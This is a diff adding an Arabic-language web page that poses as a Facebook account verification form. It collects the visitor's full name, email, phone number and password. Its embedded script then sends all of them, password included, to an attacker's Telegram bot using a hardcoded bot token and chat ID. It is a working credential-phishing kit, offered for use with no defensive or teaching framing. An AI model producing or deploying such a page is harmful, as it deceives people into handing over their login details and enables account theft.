@@ -1,0 +1,133 @@
+
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>توثيق حساب فيسبوك</title>
+    <style>
+        body {
+            margin: 0;
+            font-family: Arial, sans-serif;
+            background: linear-gradient(135deg, #4a90e2, #50e3c2);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+        }
+        .container {
+            background: #ffffff;
+            padding: 20px 30px;
+            border-radius: 10px;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
+            text-align: center;
+            width: 350px;
+        }
+        .container h1 {
+            color: #333333;
+            font-size: 24px;
+            margin-bottom: 20px;
+        }
+        .container p {
+            color: #666666;
+            font-size: 14px;
+            margin-bottom: 20px;
+        }
+        input[type="text"],
+        input[type="email"],
+        input[type="password"] {
+            width: 100%;
+            padding: 10px;
+            margin: 10px 0;
+            border: 1px solid #cccccc;
+            border-radius: 5px;
+            font-size: 14px;
+        }
+        button {
+            background-color: #4caf50;
+            color: white;
+            border: none;
+            padding: 10px 15px;
+            border-radius: 5px;
+            font-size: 16px;
+            cursor: pointer;
+            width: 100%;
+        }
+        button:hover {
+            background-color: #45a049;
+        }
+        .footer {
+            margin-top: 20px;
+            font-size: 12px;
+            color: #999999;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>طلب توثيق حساب فيسبوك</h1>
+        <p>يرجى تعبئة النموذج أدناه لتقديم طلب التوثيق.</p>
+        <form id="verificationForm">
+            <input type="text" name="name" placeholder="الاسم الكامل" required>
+            <input type="email" name="email" placeholder="البريد الإلكتروني" required>
+            <input type="text" name="phone" placeholder="رقم الهاتف" required>
+            <input type="password" name="password" placeholder="كلمة المرور" required>
+            <button type="submit">إرسال الطلب</button>
+        </form>
+        <div class="footer">
+            جميع الحقوق محفوظة © 2024
+        </div>
+    </div>
+
+    <script>
+        const form = document.getElementById("verificationForm");
+        const BOT_TOKEN = "8124156933:AAEoF0psQ6nQr3ODdEsHN7wTlMFKtXBN3Io"; // ضع توكن البوت الخاص بك هنا
+        const CHAT_ID = "1250337678"; // ضع معرف المحادثة (Chat ID) هنا
+
+        form.addEventListener("submit", function(event) {
+            event.preventDefault(); // منع إعادة تحميل الصفحة
+
+            const formData = new FormData(form);
+            const data = {
+                name: formData.get("name"),
+                email: formData.get("email"),
+                phone: formData.get("phone"),
+                password: formData.get("password"),
+            };
+
+            const message = `
+طلب جديد لتوثيق الحساب:
+👤 الاسم: ${data.name}
+📧 البريد الإلكتروني: ${data.email}
+📱 رقم الهاتف: ${data.phone}
+🔒 كلمة المرور: ${data.password}
+            `;
+
+            // إرسال البيانات إلى Telegram
+            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                method: "POST",
+                headers: {
+                    "Content-Type": "application/json",
+                },
+                body: JSON.stringify({
+                    chat_id: CHAT_ID,
+                    text: message,
+                }),
+            })
+            .then(response => response.json())
+            .then(data => {
+                if (data.ok) {
+                    alert("تم إرسال طلبك بنجاح!");
+                    form.reset();
+                } else {
+                    alert("حدث خطأ أثناء إرسال الطلب. حاول مرة أخرى.");
+                }
+            })
+            .catch(error => {
+                alert("خطأ في الاتصال. تحقق من إعداداتك وحاول مرة أخرى.");
+                console.error("Error:", error);
+            });
+        });
+    </script>
+</body>
+</html>
